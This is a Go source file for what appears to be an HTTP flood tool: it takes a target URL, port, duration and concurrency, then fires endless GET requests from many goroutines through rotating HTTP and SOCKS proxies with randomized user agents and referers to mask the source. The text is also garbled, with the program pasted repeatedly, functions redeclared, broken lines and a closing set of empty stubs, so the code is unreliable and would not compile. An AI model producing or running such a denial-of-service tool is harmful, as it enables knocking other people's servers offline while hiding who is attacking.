package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

// Define separate proxy lists
var (
	httpProxies   []*url.URL
	httpsProxies  []*url.URL
	socks4Proxies []*url.URL
	socks5Proxies []*url.URL
	// Add more proxy lists as needed
)

// Function to get the next proxy in round-robin fashion
var (
	httpIndex    int
	httpsIndex   int
	socks4Index  int
	socks5Index  int
	// Add more index variables as needed
)

func getNextProxy() *url.URL {
	// Round-robin selection logic for HTTP proxies
	if len(httpProxies) > 0 {
		proxy := httpProxies[httpIndex]
		httpIndex = (httpIndex + 1) % len(httpProxies)
		return proxy
	}

	// Round-robin selection logic for HTTPS proxies
	if len(httpsProxies) > 0 {
		proxy := httpsProxies[httpsIndex]
		httpsIndex = (httpsIndex + 1) % len(httpsProxies)
		return proxy
	}

	// Round-robin selection logic for SOCKS4 proxies
	if len(socks4Proxies) > 0 {
		proxy := socks4Proxies[socks4Index]
		socks4Index = (socks4Index + 1) % len(socks4Proxies)
		return proxy
	}

	// Round-robin selection logic for SOCKS5 proxies
	if len(socks5Proxies) > 0 {
		proxy := socks5Proxies[socks5Index]
		socks5Index = (socks5Index + 1) % len(socks5Proxies)
		return proxy
	}

	// Handle if no proxies are available (optional)
	return nil
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run main.go <url> <port> <duration> <concurrency>")
		return
	}

	urlStr := os.Args[1]
	port := os.Args[2]
	durationStr := os.Args[3]
	concurrencyStr := os.Args[4]

	duration, err := time.ParseDuration(durationStr)
	if err != nil {
		fmt.Println("Error parsing duration:", err)
		return
	}

	concurrency, err := strconv.Atoi(concurrencyStr)
	if err != nil {
		fmt.Println("Error parsing concurrency:", err)
		return
	}

	urlParsed, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println("Error parsing URL:", err)
		return
	}

	ip := urlParsed.Hostname()
	targetURL := fmt.Sprintf("%s://%s:%s", urlParsed.Scheme, ip, port)
	client := &http.Client{}

	canHTTP1 := canUseHTTP1(client, targetURL)
	fmt.Println("HTTP/1.1 test:", canHTTP1)

	canHTTP2 := canUseHTTP2(client, targetURL)
	fmt.Println("HTTP/2 test:", canHTTP2)

	canHTTP3 := canUseHTTP3(client, targetURL)
	fmt.Println("HTTP/3 test:", canHTTP3)

	var selectedProtocol string
	if canHTTP3 {
		selectedProtocol = "HTTP/3"
		client.Transport = &http3Transport{}
		fmt.Println("Server supports HTTP/3, requests will use HTTP/3 with headers and user agents")
	} else if canHTTP2 {
		selectedProtocol = "HTTP/2"
		http2Transport := &http2.Transport{}
		client.Transport = http2Transport
		fmt.Println("Server supports HTTP/2, requests will use HTTP/2 with headers and user agents")
	} else if canHTTP1 {
		selectedProtocol = "HTTP/1.1"
		client.Transport = http.DefaultTransport
		fmt.Println("Server supports HTTP/1.1, requests will use HTTP/1.1 with headers and user agents")
	} else {
		fmt.Println("Server does not support HTTP/1.1, HTTP/2, or HTTP/3")
		return
	}

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS13,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
		NextProtos: []string{
			"h2",
			"http/1.1",
		},
	}

	tr := &http.Transport{
		TLSClientConfig: tlsConfig,
		IdleConnTimeout: 90 * time.Second, // Keep-alive
	}

	client.Transport = tr
	httpProxies = loadProxyListFromFile("http_proxies.txt")
	httpsProxies = loadProxyListFromFile("https_proxies.txt")
	socks4Proxies = loadProxyListFromFile("socks4_proxies.txt")
	socks5Proxies = loadProxyListFromFile("socks5_proxies.txt")

	var wg sync.WaitGroup
	stop := make(chan struct{})

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					proxy := getNextProxy()
					if proxy == nil {
						fmt.Println("No proxy available")
						time.Sleep(time.Second) // Wait before retrying
						continue
					}

					client.Transport = createTransportWithProxy(tr, proxy)

					req, err := createRandomRequest("GET", targetURL)
					if err != nil {
						fmt.Println("Error creating request:", err)
						continue
					}

					resp, err := client.Do(req)
					if err != nil {
						fmt.Println("Error sending request via proxy", proxy, ":", err)
						continue
					}
					defer resp.Body.Close()
					fmt.Printf("Proxy %s: Response Status: %s\n", proxy, resp.Status)
				}
			}
		}()
	}

	time.Sleep(duration)
	close(stop)
	wg.Wait()
}

func createRandomRequest(method, url string) (*http.Request, error) {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	}

	headers := map[string][]string{
		"Accept-Language": {"en-US,en;q=0.9", "en-GB,en;q=0.8"},
		"Referer":         {"https://example.com", "https://another-example.com"},
	}

	rand.Seed(time.Now().UnixNano())
	randomUserAgent := userAgents[rand.Intn(len(userAgents))]
	randomHeaders := make(http.Header)
	for key, options := range headers {
		randomHeaders.Set(key, options[rand.Intn(len(options))])
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header = randomHeaders
	req.Header.Set("User-Agent", randomUserAgent)

	return req, nil
}

func canUseHTTP1(client *http.Client, url string) bool {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	return strings.HasPrefix(resp.Proto, "HTTP/1.1")
}

func canUseHTTP2(client *http.Client, url string) bool {
	http2Transport := &http2.Transport{}
	http2Client := &http.Client{Transport: http2Transport}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	resp, err := http2Client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	return resp.Proto == "HTTP/2.0"
}

func canUseHTTP3(client *http.Client, url string) bool {
	return false // Placeholder: Implement actual HTTP/3 support
}

type http3Transport struct{}

func (t *http3Transport) RoundTrip(req *http.Request) (*http.Response, error) {
	return nil, fmt.Errorf("HTTP/3 not implemented")
}

func createTransportWithProxy(baseTransport *http.Transport, proxy *url.URL) *http.Transport {
	transport := &http.Transport{
		Proxy:           http.ProxyURL(proxy),
		TLSClientConfig: baseTransport.TLSClientConfig,
	}
	if baseTransport.DialContext != nil {
		transport.DialContext = baseTransport.DialContext
	}
	if baseTransport.TLSHandshakeTimeout != 0 {
		transport.TLSHandshakeTimeout = baseTransport.TLSHandshakeTimeout
	}
	if baseTransport.MaxIdleConns !=
	0 * time.Second {
		transport.MaxIdleConns = baseTransport.MaxIdleConns
	}
	if baseTransport.MaxIdleConnsPerHost != 0 {
		transport.MaxIdleConnsPerHost = baseTransport.MaxIdleConnsPerHost
	}
	if baseTransport.IdleConnTimeout != 0 {
		transport.IdleConnTimeout = baseTransport.IdleConnTimeout
	}
	if baseTransport.ResponseHeaderTimeout != 0 {
		transport.ResponseHeaderTimeout = baseTransport.ResponseHeaderTimeout
	}

	return transport
}

func loadProxyListFromFile(filename string) []*url.URL {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		return nil
	}
	defer file.Close()

	var proxies []*url.URL
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxyStr := strings.TrimSpace(scanner.Text())
		proxy, err := url.Parse(proxyStr)
		if err != nil {
			fmt.Println("Error parsing proxy URL:", err)
			continue
		}
		proxies = append(proxies, proxy)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading proxy file:", err)
		return nil
	}

	return proxies
}
func createRandomRequest(method, url string, userAgents []string, headers map[string][]string) (*http.Request, error) {
	rand.Seed(time.Now().UnixNano())

	randomUserAgent := userAgents[rand.Intn(len(userAgents))]

	randomHeaders := make(http.Header)
	for key, options := range headers {
		randomHeaders.Set(key, options[rand.Intn(len(options))])
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return nil, err
	}

	req.Header = randomHeaders
	req.Header.Set("User-Agent", randomUserAgent)

	return req, nil
}

func canUseHTTP1(client *http.Client, url string) bool {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	return strings.HasPrefix(resp.Proto, "HTTP/1.1")
}

func canUseHTTP2(client *http.Client, url string) bool {
	http2Transport := &http2.Transport{}
	http2Client := &http.Client{Transport: http2Transport}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	resp, err := http2Client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	return resp.Proto == "HTTP/2.0"
}

func canUseHTTP3(client *http.Client, url string) bool {
	// Placeholder: Implement actual HTTP/3 support
	return false
}

type http3Transport struct{}

func (t *http3Transport) RoundTrip(req *http.Request) (*http.Response, error) {
	return nil, fmt.Errorf("HTTP/3 not implemented")
}

func createTransportWithProxy(baseTransport *http.Transport, proxy *url.URL) *http.Transport {
	transport := &http.Transport{
		Proxy:           http.ProxyURL(proxy),
		TLSClientConfig: baseTransport.TLSClientConfig,
	}
	if baseTransport.DialContext != nil {
		transport.DialContext = baseTransport.DialContext
	}
	if baseTransport.TLSHandshakeTimeout != 0 {
		transport.TLSHandshakeTimeout = baseTransport.TLSHandshakeTimeout
	}
	if baseTransport.MaxIdleConns != 0 {
		transport.MaxIdleConns = baseTransport.MaxIdleConns
	}
	if baseTransport.MaxIdleConnsPerHost != 0 {
		transport.MaxIdleConnsPerHost = baseTransport.MaxIdleConnsPerHost
	}
	if baseTransport.IdleConnTimeout != 0 {
		transport.IdleConnTimeout = baseTransport.IdleConnTimeout
	}
	if baseTransport.ResponseHeaderTimeout != 0 {
		transport.ResponseHeaderTimeout = baseTransport.ResponseHeaderTimeout
	}

	return transport
}

func loadProxyListFromFile(filename string) []*url.URL {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		return nil
	}
	defer file.Close()

	var proxies []*url.URL
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxyStr := strings.TrimSpace(scanner.Text())
		proxy, err := url.Parse(proxyStr)
		if err != nil {
			fmt.Println("Error parsing proxy URL:", err)
			continue
		}
		proxies = append(proxies, proxy)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading proxy file:", err)
		return nil
	}

	return proxies
}
package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/http2"
)

// Define separate proxy lists
var (
	httpProxies   []*url.URL
	httpsProxies  []*url.URL
	socks4Proxies []*url.URL
	socks5Proxies []*url.URL
	// Add more proxy lists as needed
)

// Function to get the next proxy in round-robin fashion
var (
	httpIndex   int
	httpsIndex  int
	socks4Index int
	socks5Index int
	// Add more index variables as needed
)

func getNextProxy() *url.URL {
	// Round-robin selection logic for HTTP proxies
	if len(httpProxies) > 0 {
		proxy := httpProxies[httpIndex]
		httpIndex = (httpIndex + 1) % len(httpProxies)
		return proxy
	}

	// Round-robin selection logic for HTTPS proxies
	if len(httpsProxies) > 0 {
		proxy := httpsProxies[httpsIndex]
		httpsIndex = (httpsIndex + 1) % len(httpsProxies)
		return proxy
	}

	// Round-robin selection logic for SOCKS4 proxies
	if len(socks4Proxies) > 0 {
		proxy := socks4Proxies[socks4Index]
		socks4Index = (socks4Index + 1) % len(socks4Proxies)
		return proxy
	}

	// Round-robin selection logic for SOCKS5 proxies
	if len(socks5Proxies) > 0 {
		proxy := socks5Proxies[socks5Index]
		socks5Index = (socks5Index + 1) % len(socks5Proxies)
		return proxy
	}

	// Handle if no proxies are available (optional)
	return nil
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run main.go <url> <port> <duration> <concurrency>")
		return
	}

	urlStr := os.Args[1]
	port := os.Args[2]
	durationStr := os.Args[3]
	concurrencyStr := os.Args[4]

	duration, err := time.ParseDuration(durationStr)
	if err != nil {
		fmt.Println("Error parsing duration:", err)
		return
	}

	concurrency, err := strconv.Atoi(concurrencyStr)
	if err != nil {
		fmt.Println("Error parsing concurrency:", err)
		return
	}

	urlParsed, err := url.Parse(urlStr)
	if err != nil {
		fmt.Println("Error parsing URL:", err)
		return
	}

	ip := urlParsed.Hostname()
	targetURL := fmt.Sprintf("%s://%s:%s", urlParsed.Scheme, ip, port)
	client := &http.Client{}

	canHTTP1 := canUseHTTP1(client, targetURL)
	fmt.Println("HTTP/1.1 test:", canHTTP1)

	canHTTP2 := canUseHTTP2(client, targetURL)
	fmt.Println("HTTP/2 test:", canHTTP2)

	canHTTP3 := canUseHTTP3(client, targetURL)
	fmt.Println("HTTP/3 test:", canHTTP3)

	var selectedProtocol string
	if canHTTP3 {
		selectedProtocol = "HTTP/3"
		client.Transport = &http3Transport{}
		fmt.Println("Server supports HTTP/3, requests will use HTTP/3 with headers and user agents")
	} else if canHTTP2 {
		selectedProtocol = "HTTP/2"
		http2Transport := &http2.Transport{}
		client.Transport = http2Transport
		fmt.Println("Server supports HTTP/2, requests will use HTTP/2 with headers and user agents")
	} else if canHTTP1 {
		selectedProtocol = "HTTP/1.1"
		client.Transport = http.DefaultTransport
		fmt.Println("Server supports HTTP/1.1, requests will use HTTP/1.1 with headers and user agents")
	} else {
		fmt.Println("Server does not support HTTP/1.1, HTTP/2, or HTTP/3")
		return
	}

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS13,
		MaxVersion: tls.VersionTLS13,
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
		NextProtos: []string{
			"h2",
			"http/1.1",
		},
	}

	tr := &http.Transport{
		TLSClientConfig: tlsConfig,
		IdleConnTimeout: 90 * time.Second, // Keep-alive
	}

	client.Transport = tr
	httpProxies = loadProxyListFromFile("http_proxies.txt")
	httpsProxies = loadProxyListFromFile("https_proxies.txt")
	socks4Proxies = loadProxyListFromFile("socks4_proxies.txt")
	socks5Proxies = loadProxyListFromFile("socks5_proxies.txt")

	var wg sync.WaitGroup
	stop := make(chan struct{})

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-stop:
					return
				default:
					proxy := getNextProxy()
					if proxy == nil {
						fmt.Println("No proxy available")
						time.Sleep(time.Second) // Wait before retrying
						continue
					}

					client.Transport = createTransportWithProxy(tr, proxy)

					req, err := createRandomRequest("GET", targetURL)
					if err != nil {
						fmt.Println("Error creating request:", err)
						continue
					}

					resp, err := client.Do(req)
					if err != nil {
						fmt.Println("Error sending request via proxy", proxy, ":", err)
						continue
					}
					defer resp.Body.Close()
					fmt.Printf("Proxy %s: Response Status: %s\n", proxy, resp.Status)
				}
			}
		}()
	}

	time.Sleep(duration)
	close(stop)
	wg.Wait()
}

func createRandomRequest(method, url string) (*http.Request, error) {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	}

	headers := map[string][]string{
		"Accept-Language": {"en-US,en;q=0.9", "en-GB,en;q=0.8"},
		"Referer":         {"https://example.com", "https://another-example.com"},
	}

	rand.Seed(time.Now().UnixNano())
	randomUserAgent := userAgents[rand.Intn(len(userAgents))]
	randomHeaders := make(http.Header)
	for key, options := range headers {
		randomHeaders.Set(key, options[rand.Intn(len(options))])
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header = randomHeaders
	req.Header.Set("User-Agent", randomUserAgent)

	return req, nil
}

func canUseHTTP1(client *http.Client, url string) bool {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	return strings.HasPrefix(resp.Proto, "HTTP/1.1")
}

func canUseHTTP2(client *http.Client, url string) bool {
	http2Transport := &http2.Transport{}
	http2Client := &http.Client{Transport: http2Transport}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return false
	}

	resp, err := http2Client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return false
	}
	defer resp.Body.Close()

	return resp.Proto == "HTTP/2.0"
}

func canUseHTTP3(client *http.Client, url string) bool {
	return false // Placeholder: Implement actual HTTP/3 support
}

type http3Transport struct{}

func (t *http3Transport) RoundTrip(req *http.Request) (*http.Response, error) {
	return nil, fmt.Errorf("HTTP/3 not implemented")
}

func createTransportWithProxy(baseTransport *http.Transport, proxy *url.URL) *http.Transport {
	transport := &http.Transport{
		Proxy:           http.ProxyURL(proxy),
		TLSClientConfig: baseTransport.TLSClientConfig,
	}
	if baseTransport.DialContext != nil {
		transport.DialContext = baseTransport.DialContext
	}
	if baseTransport.TLSHandshakeTimeout != 0 {
		transport.TLSHandshakeTimeout = baseTransport.TLSHandshakeTimeout
	}
	if baseTransport.MaxIdleConns != 0 {
		transport.MaxIdleCon
		transport.MaxIdleConns = baseTransport.MaxIdleConns
	}
	if baseTransport.MaxIdleConnsPerHost != 0 {
		transport.MaxIdleConnsPerHost = baseTransport.MaxIdleConnsPerHost
	}
	if baseTransport.IdleConnTimeout != 0 {
		transport.IdleConnTimeout = baseTransport.IdleConnTimeout
	}
	if baseTransport.ResponseHeaderTimeout != 0 {
		transport.ResponseHeaderTimeout = baseTransport.ResponseHeaderTimeout
	}
	return transport
}

func loadProxyListFromFile(filename string) []*url.URL {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error opening proxy file:", err)
		return nil
	}
	defer file.Close()

	var proxies []*url.URL
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxyStr := strings.TrimSpace(scanner.Text())
		proxyURL, err := url.Parse(proxyStr)
		if err != nil {
			fmt.Println("Error parsing proxy URL:", err)
			continue
		}
		proxies = append(proxies, proxyURL)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading proxy file:", err)
		return nil
	}

	return proxies
}

func createRandomRequest(method, url string) (*http.Request, error) {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
	}

	headers := map[string][]string{
		"Accept-Language": {"en-US,en;q=0.9", "en-GB,en;q=0.8"},
		"Referer":         {"https://example.com", "https://another-example.com"},
	}

	rand.Seed(time.Now().UnixNano())
	randomUserAgent := userAgents[rand.Intn(len(userAgents))]
	randomHeaders := make(http.Header)
	for key, options := range headers {
		randomHeaders.Set(key, options[rand.Intn(len(options))])
	}

	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return nil, err
	}
	req.Header = randomHeaders
	req.Header.Set("User-Agent", randomUserAgent)

	return req, nil
}

// Add functions for managing session cookies and headers as needed

func main() {
	// Existing main function code
}

func canUseHTTP1(client *http.Client, url string) bool {
	// Existing canUseHTTP1 function code
}

func canUseHTTP2(client *http.Client, url string) bool {
	// Existing canUseHTTP2 function code
}

func canUseHTTP3(client *http.Client, url string) bool {
	// Existing canUseHTTP3 function code
}

type http3Transport struct{}

func (t *http3Transport) RoundTrip(req *http.Request) (*http.Response, error) {
	// Existing http3Transport RoundTrip function code
}

func createTransportWithProxy(baseTransport *http.Transport, proxy *url.URL) *http.Transport {
	// Existing createTransportWithProxy function code
}

func loadProxyListFromFile(filename string) []*url.URL {
	// Existing loadProxyListFromFile function code
}

func createRandomRequest(method, url string) (*http.Request, error) {
	// Existing createRandomRequest function code
}